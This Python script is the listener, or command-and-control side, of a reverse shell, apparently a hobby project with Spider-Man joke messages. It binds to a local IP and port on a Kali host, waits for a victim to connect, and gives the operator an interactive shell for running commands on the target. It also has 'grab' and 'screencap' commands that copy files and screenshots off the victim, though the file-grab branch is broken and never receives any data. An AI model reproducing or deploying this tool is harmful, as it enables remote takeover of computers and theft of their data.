import os
import socket


def transfer(conn, command, operation):
    conn.send(command.encode())

    # Sends command to 'grab' designated file from target
    if (operation == 'grab'):
        grab, path = command.split('*')
        f = open('/home/kali/'+path,'wb')

    # Captures screenshot of target computer's monitor
    if (operation == 'screenCap'):
        print('Parker, I want pictures of Spiderman!!')
        fileName = 'screenCapture.jpg'
        f = open('/home/kali/'+fileName,'wb')

        # Checks for screenshot and exfiltrates if it can be located
        while True:
            bits = conn.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4]) # Forget DONE at the end of what's transferred
                f.close()
                print("Ladies and gentlemen... we got 'em")
                break
            if "File not found".encode() in bits:
                print('Where be the files? :(')
                break
            f.write(bits)

        print('File written to: /home/kali/'+fileName)

# Initiates and maintains connection to target
def connecting():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('192.168.153.128', 8080))
    s.listen(1)
    print("Another day dealing with J. Jonah Jameson's loud mouth.")
    print("Let's see if there's any crimes in the city...")
    conn, addr = s.accept()
    print("Spidey sense is tingling! Swinging over to ", addr)

    while True:
        command = input("Shell>: ")
        if "terminate" in command:
            conn.send('terminate'.encode())
            break
        elif "grab" in command:
            transfer(conn, command, 'grab')
        elif "screencap" in command:
            transfer(conn, command, 'screenCap')
        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connecting()

main()